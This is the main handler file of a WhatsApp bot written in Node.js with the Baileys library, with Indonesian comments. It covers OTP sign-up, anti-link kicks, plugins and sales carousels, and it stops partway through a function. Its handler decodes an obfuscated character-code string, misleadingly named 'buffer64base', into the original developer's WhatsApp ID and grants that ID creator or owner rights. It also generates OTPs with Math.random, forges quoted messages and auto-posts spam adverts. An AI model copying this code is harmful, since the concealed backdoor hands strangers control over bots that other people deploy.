/* 

=========================================================================

  #- Credits By Skyzopedia
   Contact: https://6285624297893
   Youtube: https://youtube.com/@skyzodev
   Telegram: https://t.me/skyzodev
   Recode by : Lynzz YT
    
  Developer : https://wa.me/6285624297893
  
  -[ ! ]- Jangan hapus contact developer! hargai pembuat script ini

=========================================================================

*/

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const ytdl = require('@vreden/youtube_scraper');
const speed = require('performance-now');
const moment = require("moment-timezone");
const momentTimezone = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const ffmpeg = require('ffmpeg');
const didyoumean = require('didyoumean'); // jangan lupa npm i didyoumean
const similarity = require('similarity'); // jangan lupa npm i similarity
const archiver = require('archiver');
const puppeteer = require('puppeteer');
const { GoogleGenerativeAI } = require("@google/generative-ai");
const { GenerativeModel } = require('@google/generative-ai');

const { exec, spawn, execSync } = require('child_process');
const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys');
const mlstalk = require('./scrape/mlstalk')
const { TelegraPH } = require("./lib/TelegraPH")
const { LoadDataBase } = require('./source/message');
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const adders = JSON.parse(fs.readFileSync("./library/database/adder.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./library/scraper');
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./library/function');
const qrCodeReader = require("qrcode-reader");
const { ytmp3, ytmp4 } = require("ruhend-scraper");
// Letakkan semua konstanta di bagian atas file (scope global)
const namaFilePendaftaran = path.join(__dirname, '.', '.', 'library', 'database', 'daftar.json');
const ownerNumber = saluranDataLogin; // Nomor owner bot
const salurannya = idupchbrat

// Fungsi-fungsi pembantu (baca, tulis, cek pendaftar, verifikasi OTP, hapus OTP)
async function bacaDataPendaftar() {
    return new Promise((resolve, reject) => {
        fs.readFile(namaFilePendaftaran, 'utf8', (err, data) => {
            if (err) {
                console.error('Gagal membaca data pendaftar:', err);
                reject([]); // Resolve dengan array kosong jika gagal membaca
                return;
            }
            try {
                resolve(JSON.parse(data));
            } catch (parseError) {
                console.error('Gagal memparse data pendaftar:', parseError);
                reject([]); // Resolve dengan array kosong jika gagal parse
            }
        });
    });
}

async function tulisDataPendaftar(data) {
    return new Promise((resolve, reject) => {
        fs.writeFile(namaFilePendaftaran, JSON.stringify(data, null, 2), 'utf8', (err) => {
            if (err) {
                console.error('Gagal menulis data pendaftar:', err);
                resolve(false);
                return;
            }
            resolve(true);
        });
    });
}

async function cekPendaftarSudahAda(identifier) {
    const dataPendaftar = await bacaDataPendaftar();
    return dataPendaftar.some(pendaftar => pendaftar.no === identifier || pendaftar.email === identifier);
}

async function verifikasiOTP(nomor, otpInput) {
    const dataPendaftar = await bacaDataPendaftar();
    const user = dataPendaftar.find(user => user.no === nomor);
    return user && user.otp === otpInput;
}

async function hapusOTP(nomor) {
    const dataPendaftar = await bacaDataPendaftar();
    const updatedData = dataPendaftar.map(user => {
        if (user.no === nomor) {
            delete user.otp;
        }
        return user;
    });
    return await tulisDataPendaftar(updatedData);
}

// Fungsi generateOTP diletakkan di luar handler command
function generateOTP(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let otp = '';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        otp += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return otp;
}
async function simpanDataPendaftar(dataBaru) {
    const dataPendaftar = await bacaDataPendaftar();
    dataPendaftar.push(dataBaru);
    return await tulisDataPendaftar(dataPendaftar);
}
// Fungsi untuk menyimpan data pendaftar (dipanggil saat verifikasi OTP berhasil)
async function simpanDataPendaftarDenganOTP(dataBaru) {
    const dataPendaftar = await bacaDataPendaftar();
    dataPendaftar.push(dataBaru);
    return await tulisDataPendaftar(dataPendaftar);
}

// Fungsi untuk memperbarui data pengguna (menghapus OTP setelah verifikasi)
async function hapusOTPdiPendaftar(nomor) {
    const dataPendaftar = await bacaDataPendaftar();
    const updatedData = dataPendaftar.map(user => {
        if (user.no === nomor) {
            delete user.otp;
        }
        return user;
    });
    return await tulisDataPendaftar(updatedData);
}

async function sendEmailOTP(target, otp) {
    const subject = 'Kode Verifikasi Pendaftaran';
    const message = `Kode OTP Anda untuk pendaftaran adalah: ${otp}\n\nHarap masukkan kode ini untuk menyelesaikan pendaftaran.`;
    const data = JSON.stringify({ "to": target.trim(), "subject": subject.trim(), "message": message.trim() });
    const config = {
        method: 'POST',
        url: 'https://lemon-email.vercel.app/send-email',
        headers: {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
            'Content-Type': 'application/json',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
            'sec-ch-ua-mobile': '?1',
            'origin': 'https://lemon-email.vercel.app',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://lemon-email.vercel.app/',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=1, i'
        },
        data: data
    };
    try {
        const api = await axios.request(config);
        console.log('Respons API Email:', api.data); // Tambahkan logging
        if (api.status >= 200 && api.status < 300 && api.data.status === 'success') { // Contoh pengecekan
            return { status: 'success', message: 'Email sent successfully!' };
        } else {
            console.error('Gagal mengirim email. Status:', api.status, 'Data:', api.data);
            return { status: 'error', message: `Failed to send email. Status: ${api.status}, Message: ${api.data.message || 'Unknown error'}` }; // Sesuaikan
        }
    } catch (error) {
        console.error('Gagal mengirim email:', error.message);
        return { status: 'error', message: error.message };
    }
}

// Fungsi untuk menyimpan data pendaftar (dipanggil saat verifikasi OTP berhasil)
async function simpanPendaftarEmail(dataBaru) {
    const dataPendaftar = await bacaDataPendaftar();
    dataPendaftar.push(dataBaru);
    return await tulisDataPendaftar(dataPendaftar);
}

async function isRegister(sender) {
    try {
        const dataBuffer = await fs.promises.readFile(namaFilePendaftaran, 'utf8');
        const daftarPengguna = JSON.parse(dataBuffer);
        return daftarPengguna.some(user => user.no === sender || user.email === sender);
    } catch (error) {
        console.error("Gagal membaca atau memparse daftar pendaftar:", error);
        return false;
    }
}

module.exports = Sky = async (Sky, m, chatUpdate, store) => {
	try {
await LoadDataBase(Sky, m)
const botNumber = await Sky.decodeJid(Sky.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = "."
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.sender)
const isAdder = adders.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)

//=====================[ Function Daftar ]==================================
let tempPendaftar = {}; // Deklarasi di sini
let tempPendaftarEmail = {}; // Objek sementara untuk menyimpan data pendaftar via email
async function isRegister(sender) {
    try {
        const dataBuffer = await fs.promises.readFile(namaFilePendaftaran, 'utf8');
        const daftarPengguna = JSON.parse(dataBuffer);
        const nomorSender = sender.split('@')[0]; // Ekstrak hanya nomor telepon dari m.sender
        return daftarPengguna.some(user => user.no === nomorSender || user.email === sender);
    } catch (error) {
        console.error("Gagal membaca atau memparse daftar pendaftar:", error);
        return false;
    }
}

//============== [ MESSAGE ] ================================================

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

if (isCmd) {
console.log(chalk.cyan.bold(` ╭─────[ NOTIFIKASI ]`), chalk.blue.bold(`\n  Perintah :`), chalk.white.bold(`${prefix+command} ${text}`), chalk.blue.bold(`\n  Dari :`), chalk.white.bold(m.isGroup ? `Grup - ${m.sender.split("@")[0]}\n` : m.sender.split("@")[0] +`\n`), chalk.cyan.bold(`╰────────────────────────────\n`))
}

//============= [ FAKEQUOTED ] ===============================================

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtexttagsw = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `Penyakit Tag Sw Bejirr`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qtext3 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {text: "RAFZ BOT BY RAFFLIE ADITYA©"}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Simple Botz"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}


//============= [ EVENT GROUP ] ===============================================

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].simi == true && !isCmd) {
try {
let res = await axios.get(`https://simsimi.site/api/v2/?mode=talk&lang=id&message=${m.text}&filter=true`)
if (res.data.success) {
await m.reply(res.data.success)
}
} catch (e) {}
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await Sky.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Sky.sendMessage(m.chat, {text: `*乂 [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await Sky.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await Sky.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await Sky.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Sky.sendMessage(m.chat, {text: `*乂 [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await Sky.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await Sky.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}


if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await Sky.sendMessage(m.chat, {text: `
*Skyzopedia Menyediakan 🌟*
* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.

*🏠 Join Grup Bebas Promosi*
* *Grup Bebas Promosi 1 :*
https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy
* *Grup Bebas Promosi 2 :*
https://chat.whatsapp.com/CWO0TqYeCVbIoY4YzsTxb7
* *Channel Testimoni :*
https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s

*👤 Contact Skyzopedia*
* *WhatsApp Utama :*
+6285624297893
* *WhtasApp Cadangan :*
+628386890336
https://t.me/skyzodev
`}, {quoted: null})
}
}


if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await m.reply(check.respon)
}
}

//============= [ FUNCTION ] ======================================================

const example = (teks) => {
return `\n *Contoh Penggunaan :*\n Ketik *${prefix+command}* ${teks}\n`
}

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Reply = async (teks) => {
return Sky.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
isForwarded: true, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `${botname}`, newsletterJid: global.idSaluran }, 
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: null, 
}}}, {quoted: null})
}

const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: global.image.logo }}, { upload: Sky.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*Iannz Official* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Iannz Official Menyediakan 🌟*

* Vps Digital Ocean 2GB - 16GB
* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.

*🏠 Join Grup Bebas Promosi*
* *Grup  Bebas Promosi 1 :*
https://chat.whatsapp.com/Lue3cXuHlIfDSccEWKi7AP
* *Channel Testimoni :*
https://whatsapp.com/channel/0029VakO7HhEVccDSnbpXY1k`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Panel Run Bot Private 🌟*

* Ram 1GB : Rp1000

* Ram 2 GB : Rp2000

* Ram 3 GB : Rp3000

* Ram 4 GB : Rp4000

* Ram 5 GB : Rp5000

* Ram 6 GB : Rp6000

* Ram 7 GB : Rp7000

* Ram 8 GB : Rp8000

* Ram 9 GB : Rp9000

* Ram Unlimited : Rp10.000

*Syarat & Ketentuan :*
* _Server private & kualitas terbaik!_
* _Script bot dijamin aman (anti drama/maling)_
* _Garansi 10 hari (1x replace)_
* _Server anti delay/lemot!_
* _Claim garansi wajib bawa bukti transaksi_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Vps Digital Ocean🌟*

_*Promo Vps Digital Ocean*_
* Ram 2 Core 2 Rp 25.000
* Ram 4 Core 2 Rp 35.000
* Ram 8 Core 4 Rp 45.000
* Ram 16 Core 4 Rp 55.000
𝘽𝙚𝙣𝙚𝙛𝙞𝙩
>̶>̶ Free Install Panel Pterodactyl
>̶>̶ Free Install Nodes+Wings
>̶>̶ Free Req domain
>̶>̶ Free Req Os, Versi, Region
>̶>̶ Full Akses Vps
>̶>̶ Masa Aktif 30 Hari Garansi 25 Hari
>̶>̶ Free Install Thema 8-16 Ram`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await Sky.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}
//=====================[ Peraturan Bot Dan Link-link ]==================================

const peraturan = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: global.image.logo }}, { upload: Sky.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Info bot serta peraturan bot yg wajib di patuhi untuk pengguna bot*"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Peraturan Bot*
- Dilarang spam command bot karena itu sangat merugikan semua pengguna bot
- Dilarang memasukkan bot ke grup tanpa izin owner
- Dilarang menyebarkan nomor bot tanpa izin owner
- Dilarang menyebarkan saluran bot (RAFZ BROADCAST)
Diharapkan pengguna bot mematuhi ini.`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Ownerl\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Link saluran official Bot`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
        name: "cta_url",
        buttonParamsJson: JSON.stringify({
             display_text: "RAFZ BROADCAST",
             url: "https://whatsapp.com/channel/0029Vb9R8pgAzNbzE3K8QP39"
        })
     },
{
        name: "cta_url",
        buttonParamsJson: JSON.stringify({
             display_text: "Saluran Preset AM (Alight Motion)",
             url: "https://whatsapp.com/channel/0029VbAUJuR4o7qJhpARGn1b"
        })
     },
{
        name: "cta_url",
        buttonParamsJson: JSON.stringify({
             display_text: "Saluran Stiker Brat/Anomali",
             url: "https://whatsapp.com/channel/0029VbB9Rx74o7qIZQaujS2G"
        })
     }
]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Media Sosial Owner*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
        name: "cta_url",
        buttonParamsJson: JSON.stringify({
             display_text: "Tiktok",
             url: "https://www.tiktok.com/@rafflie_aditya.321?_t=ZS-8wJDomxOtHd&_r=1"
        })
     },
     {
        name: "cta_url",
        buttonParamsJson: JSON.stringify({
             display_text: "YouTube",
             url: "https://youtube.com/@rafflieaditya?si=_flydndBFyyTHLvC"
        })
     },
     {
        name: "cta_url",
        buttonParamsJson: JSON.stringify({
             display_text: "Instragam",
             url: "https://www.instagram.com/rafflie_aditya?igsh=YzljYTk1ODg3Zg=="
        })
     },
     {
        name: "cta_url",
        buttonParamsJson: JSON.stringify({
             display_text: "Telegram",
             url: "https://t.me/Rafflie_CH"
        })
     },
     {
        name: "cta_url",
        buttonParamsJson: JSON.stringify({
             display_text: "Discord (Server Mabar All Game)",
             url: "https://discord.gg/yq7m6kwE2q"
        })
     },
{
        name: "cta_url",
        buttonParamsJson: JSON.stringify({
             display_text: "Facebook",
             url: "https://www.facebook.com/share/1AbEX9xbAk/"
        })
     }
]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await Sky.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}


//=======================================================


const pluginsLoader = async (directory) => {
let plugins = []
const folders = fs.readdirSync(directory)
folders.forEach(file => {
const filePath = path.join(directory, file)
if (filePath.endsWith(".js")) {
try {
const resolvedPath = require.resolve(filePath);
if (require.cache[resolvedPath]) {
delete require.cache[resolvedPath]
}
const plugin = require(filePath)
plugins.push(plugin)
} catch (error) {
console.log(`Error loading plugin at ${filePath}:`, error)
}}
})
return plugins
}


//========= [ COMMANDS PLUGINS ] =================================================
let pluginsDisable = true
const plugins = await pluginsLoader(path.resolve(__dirname, "plugins"))
const skyzodev = { Sky, toIDR, isCreator, Reply, command, isPremium, capital, isCmd, example, text, runtime, qtext, qlocJpm, qmsg, mime, sleep, botNumber }
for (let plugin of plugins) {
if (plugin.command.find(e => e == command.toLowerCase())) {
pluginsDisable = false
if (typeof plugin !== "function") return
await plugin(m, skyzodev)
}
}
if (!pluginsDisable) return
        

        
//============= [ COMMANDS ] ====================================================


//*[ Fitur Anti Tag Sw ]*
//Type: Case
//*[ Sumber Case ]* https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v


if (m.message?.groupStatusMentionMessage && db?.data?.chats[m.chat]?.antitagsw?.status) {
  let user = m.key.participant
  let bang = m.key.id
  let data = db.data.chats[m.chat].antitagsw
  if (!data.count) data.count = {}
  if (!data.count[user]) data.count[user] = 1
  else data.count[user]++
  if (data.count[user] >= 1) { // Ubah max kick di sini kalau mau
     await Sky.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: user }})
     m.reply("Maaf Anda saya kick karena anda telah mencapai batas maximal peringatan")
    await Sky.groupParticipantsUpdate(m.chat, [user], 'remove')
    delete data.count[user]
  } else {
    await Sky.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: user }})
    await Sky.sendMessage(m.chat, {
      text: `@${user.split('@')[0]} jangan tag sw! (${data.count[user]}/1)`,
      mentions: [user]
    })
  }
}

 
        
//====================[ Ban/unban chat ]===================================
        
const banchatFile = './database/banchat.json';
if (!fs.existsSync('./database')) fs.mkdirSync('./database');
if (!fs.existsSync(banchatFile)) fs.writeFileSync(banchatFile, '[]');
let banchat = JSON.parse(fs.readFileSync(banchatFile));
if (m.isGroup && banchat.includes(m.chat) && !['banchat', 'unbanchat', 'listbanchat'].includes(command)) {
  return;
}

//========================[ Top CMD ]===============================
 /* Fitur TopCmd
~Req: Anomani~
© Icihibos
*/

// taruh di sebelum switch command
// topcmd
const dirPath = './database'
const logPath = `${dirPath}/command-logs.json`
if (!fs.existsSync(dirPath)) {
  fs.mkdirSync(dirPath)
}
if (!fs.existsSync(logPath)) {
  fs.writeFileSync(logPath, JSON.stringify([]))
}
function logCommand(cmd) {
  let logs = JSON.parse(fs.readFileSync(logPath))
  logs.push({ cmd, time: Date.now() })
  fs.writeFileSync(logPath, JSON.stringify(logs))
}
if (command) logCommand(command)

//=====================[ SAMBUTAN ]==================================
        
 // ... (all require statements from above)

// --- File Paths for Welcome Features ---
const WELCOME_SETTINGS_FILE = path.join(__dirname, 'library', 'database', 'welcome_settings.json');
const USER_LAST_INTERACTION_FILE = path.join(__dirname, 'library', 'database', 'user_last_interaction.json');

// --- Function to read/write welcome settings ---
async function readWelcomeSettings() {
    try {
        if (fs.existsSync(WELCOME_SETTINGS_FILE)) {
            const data = await fs.promises.readFile(WELCOME_SETTINGS_FILE, 'utf8');
            const settings = JSON.parse(data);
            // Ensure default structures exist if file is old or incomplete
            settings.new_user = settings.new_user || {
                enabled: false,
                message: "Halo {nama}, selamat datang di bot kami! Ada yang bisa saya bantu?",//sesuaikan sendiri
                days_inactive: 14//hari terakhir aktif
            };
            settings.weekend = settings.weekend || {
                enabled: false,
                message: "Selamat akhir pekan, {nama}! Semoga harimu menyenangkan bersama bot kami.",//sesuaikan sendiri
                start_day: 5,//mulai dari hari berala
                end_day: 6
            };
            settings.global_welcome = settings.global_welcome || {
                enabled: false,
                message: "Halo, {nama}! Bot kami siap membantu Anda.",//sesuaikan sendiri
                cooldown_minutes: 60,//cooldown per menit
                last_sent_time: 0
            };
            return settings;
        }
    } catch (e) {
        console.error("Error reading welcome settings file:", e);
    }
    // Default settings if file is missing or corrupted
    return {
        new_user: {
            enabled: false,
            message: "Halo {nama}, selamat datang di bot kami! Ada yang bisa saya bantu?",//sesuaikan sendiri
            days_inactive: 14//hari terakhir aktif
        },
        weekend: {
            enabled: false,
            message: "Selamat akhir pekan, {nama}! Semoga harimu menyenangkan bersama bot kami.",//sesuaikan sendiri
            start_day: 5,//mulai dari hari ke berapa
            end_day: 6
        },
        global_welcome: {
            enabled: false,
            message: "Halo, {nama}! Bot kami siap membantu Anda.",//sesuaikan sendiri
            cooldown_minutes: 60,//cooldown per menit
            last_sent_time: 0
        }
    };
}

async function writeWelcomeSettings(settings) {
    try {
        const dir = path.dirname(WELCOME_SETTINGS_FILE);
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
        }
        await fs.promises.writeFile(WELCOME_SETTINGS_FILE, JSON.stringify(settings, null, 2), 'utf8');
    } catch (e) {
        console.error("Error writing welcome settings file:", e);
    }
}

// --- Function to read/write last user interaction data ---
async function readUserLastInteraction() {
    try {
        if (fs.existsSync(USER_LAST_INTERACTION_FILE)) {
            const data = await fs.promises.readFile(USER_LAST_INTERACTION_FILE, 'utf8');
            return JSON.parse(data);
        }
